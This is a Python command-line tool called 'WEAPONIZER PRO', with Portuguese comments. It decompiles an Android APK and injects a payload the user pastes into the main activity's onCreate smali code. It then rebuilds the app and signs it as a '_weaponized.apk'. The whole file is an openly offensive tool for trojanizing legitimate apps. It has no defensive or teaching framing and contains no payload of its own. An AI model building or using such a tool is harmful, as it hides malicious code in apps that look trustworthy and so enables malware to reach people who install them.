import subprocess
import re
import os
import sys
import time
from shutil import which

# --- CONFIGURAÇÃO VISUAL ---
RED, DARK_RED, WHITE, BOLD, RESET, YELLOW, GREEN = "\33[91m", "\33[31m", "\33[97m", "\33[1m", "\33[0m", "\33[93m", "\33[92m"

def log(msg, level="info"):
    p = {"info": f"{WHITE}[*]{RESET}", "success": f"{GREEN}[+]{RESET}", "warn": f"{YELLOW}[!]{RESET}", "error": f"{BOLD}{RED}[-]{RESET}"}
    print(f"{p.get(level, '[*]')} {msg}")

def exibir_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = fr"""
{RED} ██╗    ██╗███████╗ █████╗ ██████╗  ██████╗ ███╗   ██╗██╗███████╗███████╗██████╗ 
{RED} ██║    ██║██╔════╝██╔══██╗██╔══██╗██╔═══██╗████╗  ██║██║╚══███╔╝██╔════╝██╔══██╗
{DARK_RED} ██║ █╗ ██║█████╗  ███████║██████╔╝██║   ██║██╔██╗ ██║██║  ███╔╝ █████╗  ██████╔╝
{DARK_RED} ██║███╗██║██╔══╝  ██╔══██║██╔═══╝ ██║   ██║██║╚██╗██║██║ ███╔╝  ██╔══╝  ██╔══██╗
{RED} ╚███╔███╔╝███████╗██║  ██║██║     ╚██████╔╝██║ ╚████║██║███████╗███████╗██║  ██║
{RED}  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
{RESET}
 {WHITE}{BOLD}WEAPONIZER PRO{RESET} | {WHITE}Direct Injection & Command Support{RESET}
 {DARK_RED}─────────────────────────────────────────────────────────────────────────────{RESET}
    """.strip()
    print(banner)

def capturar_payload():
    """Captura múltiplas linhas de código do terminal até encontrar 'DONE'."""
    print(f"\n{YELLOW}[>] Cole seu payload abaixo. Digite {BOLD}'DONE'{RESET}{YELLOW} em uma nova linha para injetar.{RESET}")
    print(f"{DARK_RED}--- INÍCIO DO PAYLOAD (Cole aqui) ---{RESET}")
    lines = []
    while True:
        try:
            line = input()
            if line.strip().upper() == "DONE": break
            lines.append(line)
        except EOFError: break
    print(f"{DARK_RED}--- FIM DO BLOCO ---{RESET}")
    return "\n".join(lines)

def injetar_payload_smali(project_folder):
    manifest = os.path.join(project_folder, "AndroidManifest.xml")
    if not os.path.exists(manifest):
        log("Erro: Manifesto não encontrado!", "error"); return False

    with open(manifest, "r") as f:
        content = f.read()
        match = re.search(r'<activity [^>]*android:name="([^"]+)"', content)
        if not match: log("Ponto de entrada não detectado!", "error"); return False
        main_activity = match.group(1)

    smali_filename = main_activity.replace('.', '/') + ".smali"
    target_path = None
    for root, dirs, files in os.walk(project_folder):
        if smali_filename in os.path.join(root, smali_filename) and os.path.exists(os.path.join(root, smali_filename)):
            target_path = os.path.join(root, smali_filename)
            break
    
    if not target_path:
        log("Classe Smali principal não encontrada!", "error"); return False

    log(f"Alvo para injeção: {BOLD}{os.path.basename(target_path)}{RESET}", "success")
    payload_content = capturar_payload()
    
    if not payload_content.strip():
        log("Injeção cancelada.", "warn"); return False

    with open(target_path, "r") as f:
        lines = f.readlines()

    final_lines, in_oncreate, injected = [], False, False
    for line in lines:
        final_lines.append(line)
        if ".method" in line and "onCreate(Landroid/os/Bundle;)V" in line: in_oncreate = True
        if in_oncreate and not injected:
            if "invoke-super" in line or ".locals" in line:
                final_lines.append(f"\n    # --- AUTO-INJECT ---\n    {payload_content}\n    # --- END ---\n\n")
                injected = True
        if ".end method" in line: in_oncreate = False

    if injected:
        with open(target_path, "w") as f: f.writelines(final_lines)
        log("Smali modificado com sucesso!", "success"); return True
    return False

def build_e_assinar(out):
    final_apk = f"{out}_weaponized.apk"
    log(f"Recompilando '{out}'...", "info")
    res = subprocess.run(["apktool", "b", out, "-o", "tmp.apk"], capture_output=True, text=True)
    if res.returncode != 0:
        log("Erro de compilação!", "error"); print(res.stderr); return

    ks = "debug.keystore"
    if not os.path.exists(ks):
        subprocess.run(["keytool", "-genkey", "-v", "-keystore", ks, "-alias", "dev", "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000", "-storepass", "android", "-keypass", "android", "-dname", "CN=Weaponizer"], capture_output=True)

    log("Assinando artefato final...", "info")
    subprocess.run(["apksigner", "sign", "--ks", ks, "--ks-pass", "pass:android", "--out", final_apk, "tmp.apk"])
    if os.path.exists("tmp.apk"): os.remove("tmp.apk")
    log(f"Concluído: {BOLD}{final_apk}{RESET}", "success")
    input("\nEnter para voltar...")

def main():
    while True:
        exibir_banner()
        print(f" [{RED}1{RESET}] Decompile APK")
        print(f" [{RED}2{RESET}] Auto-Inject & Build")
        print(f" [{RED}3{RESET}] Fechar")
        
        try: login = os.getlogin()
        except: login = "user"
        
        cmd = input(f"\n {BOLD}{RED}WEAPONIZER@{login}:~# {RESET}").strip()
        
        # --- SISTEMA DE COMANDOS INTEGRADOR ---
        if cmd.lower() == "ls":
            print(f"\n{BOLD}{WHITE}Arquivos no diretório:{RESET}")
            subprocess.run(["ls", "-F", "--color=auto"])
            input(f"\nPressione Enter para continuar...")
            continue
        elif cmd.lower() == "clear":
            continue
        elif cmd == "1":
            path = os.path.expanduser(input(f" {RED}»{RESET} APK: ").strip())
            if os.path.exists(path):
                out = os.path.splitext(os.path.basename(path))[0]
                subprocess.run(["apktool", "d", path, "-o", out, "-f"])
                log(f"Pasta criada: {out}", "success"); time.sleep(2)
            else: log("Arquivo não encontrado.", "error"); time.sleep(1)
        elif cmd == "2":
            out = input(f" {RED}»{RESET} Pasta do projeto: ").strip().rstrip('/')
            if os.path.isdir(out):
                if injetar_payload_smali(out): build_e_assinar(out)
            else: log("Pasta não encontrada.", "error"); time.sleep(1)
        elif cmd == "3" or cmd.lower() == "exit":
            break
        elif cmd == "": continue
        else:
            log(f"Comando '{cmd}' desconhecido.", "error"); time.sleep(1)

if __name__ == "__main__":
    main()
